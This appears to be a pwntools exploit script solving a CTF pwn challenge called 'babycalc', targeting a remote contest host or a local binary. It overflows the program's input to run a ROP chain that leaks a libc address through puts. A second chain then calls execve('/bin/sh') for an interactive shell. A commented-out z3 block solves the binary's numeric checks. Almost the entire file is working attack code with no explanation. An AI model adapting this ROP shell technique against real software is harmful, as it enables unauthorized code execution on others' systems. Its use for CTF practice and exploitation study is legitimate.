# -*- coding: UTF-8 -*-
from pwn import *
from z3 import *
import sys
from pwnlib.util.iters import mbruteforce 

context.log_level = 'debug'
python_version = sys.version_info.major
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')

debug = False if "r" in sys.argv else True

vuln_name = "./babycalc"
libc_path = "/home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"
libc_source_path = "/home/yrl/glibc-all-in-one/libs-src/glibc-2.36"
libc_symbol_path = "/home/yrl/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/.debug/d1/704d25fbbb72fa95d517b883131828c0883fe9.debug"

elf, rop = ELF(vuln_name), ROP(vuln_name)
libc, roplibc = ELF(libc_path), ROP(libc_path)
os.system("chmod +x " + vuln_name)

if debug:
    io = process([vuln_name],env={'LD_PRELOAD':libc_path})
else:
    io = remote("tcp.cloud.dasctf.com", 28504)

def debug(io, gdb_script):
    if gdb_script != None:
        gdb.attach(io,gdb_script.format(libc_symbol_path=libc_symbol_path,libc_source_path=libc_source_path))
    gdb.attach(io)
    pause()

def get_libc_gadget(rop_gadget):
    if python_version == 2:
        gadget = libc.search(rop_gadget).next() if rop_gadget == '/bin/sh\x00' else libc.search(asm(rop_gadget)).next()
    else:
        gadget = libc.search(rop_gadget).__next__() if rop_gadget == b'/bin/sh\x00' else libc.search(asm(rop_gadget)).__next__()
    return gadget

    
gdb_script='''
source /home/yrl/loadsym.py
loadsym {libc_symbol_path}
dir {libc_source_path}
dir {libc_source_path}/libio
'''
l64 = lambda      :u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
l32 = lambda      :u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a.encode(),b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x.encode()) if python_version == 3 and type(x) == str else io.sendline(x)
sa = lambda a,b		: io.sendafter(a.encode(),b.encode()) if python_version == 3 and type(b) == str else io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a.encode(),b.encode()) if python_version == 3 and type(b) == str else io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : debug(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))

#charset = string.printable
## charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 
#hash_code = io.recvuntil('\n', drop=True).decode().strip() 
## lg('hash_code')
#log.success('hash_code={}'.format(hash_code)) 
#passstr = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') 
#sla('pass:',passstr)
'''
a = [z3.BitVec("p%d" % i, 8)for i in range(16)]

s=Solver()

s.add(a[2]*a[1]*a[0]-a[3]==0x8D56)
s.add(a[0]==19)
s.add(a[2]*19*a[1] + a[3]==36322)
s.add((a[10] + a[0]-a[5])*a[13]==32835)
s.add((a[1]*a[0]-a[2])*a[3]==0xAC8A)
s.add((a[2] + a[1]*a[0])*a[3]==0xC986)
s.add(a[6]*a[5]*a[4]-a[7]==0xF06D)
s.add(a[7]*a[12] + a[1] + a[15]==0x4A5D)
s.add(a[6]*a[5]*a[4] + a[7]==0xF1AF)
s.add((a[5]*a[4]-a[6])*a[7]==0x8E03D)
s.add(a[8]==50)
s.add((a[6] + a[5]*a[4])*a[7]==0x8F59F)
s.add(a[10]*a[9]*a[8]-a[11]==0x152FD3)
s.add(a[10]*a[9]*a[8] + a[11]==0x15309D)
s.add((a[9]*a[8]-a[10])*a[11]==0x9C48A)
s.add((a[8]*a[2]-a[13])*a[9]==0x4E639)
s.add((a[10] + a[9]*a[8])*a[11]==0xA6BD2)
s.add(a[14]*a[13]*a[12]-a[15]==0x8996D)
s.add(a[14]*a[13]*a[12] + a[15]==0x89973)
s.add(a[11]==0x65)
s.add((a[13]*a[12]-a[14])*a[15]==0x112E6)
s.add((a[14] + a[13]*a[12])*a[15]==0x11376)


while(s.check()==sat):

  answer=s.model()
  flag = []
  for i in range(len(answer)):
    #print (input[i])
    # flag.append(answer[a[i]].as_long())
    flag.append(answer[a[i]].as_long())
  # print (flag)
  #print(flag)
  #dbg()
  io = process([vuln_name],env={'LD_PRELOAD':libc_path})
  sla('number-1:',str(flag[0]))

  for i in range(1,15):
	sla('number-%d:'%(i+1),str(flag[i]))
  sla('number-16:',str(flag[15]))
  try:
	  re = io.recvall()
	  if 'good done' in re:
	      print(flag)
	      break

  except:
  	continue
# flag = ['19', '36', '53', '70', '55', '66', '17', '161', '50', '131', '212', '101', '118', '199', '24', '3']
'''

main = 0x400C1A
pop_rdi = 0x0000000000400ca3
pop_rsi = 0x0000000000400ca1
putsplt = elf.plt['puts']
putsgot = elf.got['puts']
ret = 0x400C19

rop = p64(pop_rdi) + p64(putsgot) + p64(putsplt) + p64(main)
pay = '24'.ljust(0x8,'a')
pay += p64(ret) * (0x19-4)
pay += rop
pay += '\x13\x24\x35\x46\x37\x42\x11\xa1\x32\x83\xd4\x65\x76\xc7\x18\x03' + 'b' * 0x1c + '\x38\x00\x00\x00'
sa('number-1:',  pay)


libc.address = l64() - libc.symbols['puts']
lg('libc.address')
execve = libc.symbols['execve']
lg('execve')
binsh = get_libc_gadget('/bin/sh\x00')
lg('binsh')
pop_rdx = get_libc_gadget('pop rdx;ret')
pop_rsi = get_libc_gadget('pop rsi;ret')

rop = p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) +p64(execve)
pay = '24'.ljust(0x8,'a')
pay += p64(ret) * (0x19-7)
pay += rop
pay += '\x13\x24\x35\x46\x37\x42\x11\xa1\x32\x83\xd4\x65\x76\xc7\x18\x03' + 'b' * 0x1c + '\x38\x00\x00\x00'
#dbg()
sa('number-1:',  pay)

irt()


